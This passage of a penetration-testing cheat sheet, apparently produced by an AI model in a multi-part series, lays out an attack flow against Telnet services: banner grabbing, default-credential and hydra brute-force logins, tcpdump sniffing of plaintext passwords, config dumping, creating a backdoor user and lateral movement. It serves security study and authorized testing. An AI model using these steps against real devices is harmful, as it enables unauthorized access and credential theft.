  to: https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-software-releases-121-mainline/6130-index.html
  target: _blank
  ---
  Official Cisco password recovery procedures for when you gain physical access.
  ::

  ::card
  ---
  title: RFC 854 — Telnet Protocol
  icon: i-lucide-book-open
  to: https://datatracker.ietf.org/doc/html/rfc854
  target: _blank
  ---
  Official Telnet protocol specification.
  ::
::

---

## Attack Flow Diagram

::steps{level="4"}

#### Discovery & Banner

```bash [Terminal]
nmap -sV -sC -p 23 $IP
nc -nv $IP 23
```
→ **Identify device type** from banner

#### Default Credentials

```bash [Terminal]
telnet $IP
# Try device-specific defaults
```
→ **Login successful?** → Enumerate device, dump config, create backdoor user

#### Brute Force

```bash [Terminal]
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://$IP
```
→ **Creds found?** → Login and exploit

#### Credential Sniffing (if on same network)

```bash [Terminal]
tcpdump -i eth0 -A port 23
```
→ **Credentials captured?** → Login with captured creds

#### Device-Specific Exploitation

```bash [Terminal]
# Cisco: show running-config
# MikroTik: /user print
# Printer: @PJL INFO FILESYS
```
→ **Sensitive data?** → Extract configs, credentials, network info

#### Lateral Movement

```bash [Terminal]
# Use discovered credentials on SSH, web interfaces, other devices
```

::
```

---

::note
**Progress: 4 of 25 ports completed** in full detail (Port 21 FTP, Port 22 SSH, Port 23 Telnet, Port 25 SMTP). Reply **"Continue"** to get the next batch of ports (53 DNS, 80 HTTP, 88 Kerberos, 110 POP3) written in the same comprehensive style.
::